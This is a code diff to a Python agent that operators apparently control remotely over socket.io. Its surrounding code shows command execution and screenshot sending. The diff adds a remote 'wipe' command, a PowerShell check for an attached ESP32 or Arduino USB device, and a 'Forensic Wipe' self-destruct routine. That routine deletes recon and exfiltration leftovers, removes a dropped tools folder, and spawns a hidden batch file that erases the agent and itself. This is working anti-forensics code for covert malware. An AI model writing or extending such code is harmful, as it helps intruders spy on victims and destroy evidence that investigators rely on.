@@ -151,6 +151,11 @@ def execute_command(cmd):
         self_destruct()
 
 @sio.event
+def trigger_wipe():
+    print_log("WIPE COMMAND RECEIVED FROM DASHBOARD! Erasing all evidence...")
+    self_destruct()
+
+@sio.event
 def execute_json_command(data):
     print_log(f"Received JSON Command: {data}")
     try:
@@ -276,24 +281,69 @@ def send_screenshots():
 
 def check_heartbeat_usb():
     """Semak sama ada ESP32 USB masih dicucuk."""
-    # Dalam implementasi sebenar, ini akan memeriksa kehadiran COM port
-    return True
+    try:
+        import subprocess
+        # Check for standard ESP32-S3 USB IDs or generic Arduino/Serial IDs
+        # VID_303A is Espressif, VID_2341 is Arduino
+        output = subprocess.check_output(
+            'powershell "Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match \'VID_303A\' -or $_.DeviceID -match \'VID_2341\' } | Select-Object DeviceID"',
+            shell=True, stderr=subprocess.DEVNULL
+        ).decode('utf-8', errors='ignore')
+        
+        if "VID_303A" in output or "VID_2341" in output:
+            return True
+        return False
+    except Exception as e:
+        # Fallback to true if WMI fails so we don't accidentally kill the agent
+        print_log(f"USB Check Failed: {e}")
+        return True
 
 def self_destruct():
-    """Bunuh agent dan padam jejak."""
+    """Bunuh agent dan padam jejak (Forensic Wipe)."""
     global running
-    print_log("Initiating Self-Destruct Sequence...")
-    running = False  # BETULKAN: 'False' bukan 'false'
+    print_log("Initiating Self-Destruct & Forensic Wipe Sequence...")
+    running = False
+    
     try:
         sio.disconnect()
     except Exception:
         pass
-    # Padam fail sendiri
+        
     try:
-        os.remove(os.path.abspath(__file__))
-    except Exception:
-        pass
-    sys.exit(0)
+        import shutil
+        # 1. Padam fail recon/exfiltration yang mungkin ditinggalkan oleh ESP32
+        temp_dir = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'sys_report')
+        if os.path.exists(temp_dir):
+            shutil.rmtree(temp_dir, ignore_errors=True)
+            
+        # 2. Padam sebarang tools tambahan (contoh PinchTab)
+        pinchtab_dir = os.path.join(os.environ.get('TEMP', ''), 'PinchTab')
+        if os.path.exists(pinchtab_dir):
+            shutil.rmtree(pinchtab_dir, ignore_errors=True)
+            
+        # 3. Hasilkan skrip bunuh diri untuk padam ejen ini dari background
+        script_path = os.path.abspath(__file__)
+        bat_path = os.path.join(os.environ.get('TEMP', ''), 'wipe_ghost.bat')
+        
+        # Bat script: tunggu 2 saat, padam fail python, padam diri sendiri (bat)
+        bat_content = f"""
+@echo off
+timeout /t 2 /nobreak > NUL
+del /f /q "{script_path}"
+del /f /q "%~f0"
+"""
+        with open(bat_path, 'w') as f:
+            f.write(bat_content)
+            
+        # Jalankan bat script di background (detached)
+        import subprocess
+        subprocess.Popen(bat_path, creationflags=subprocess.CREATE_NO_WINDOW)
+        
+    except Exception as e:
+        print(f"Cleanup error: {e}")
+        
+    # Bunuh proses Python ini serta-merta
+    os._exit(0)
 
 # ============================================================
 # MAIN LOOP
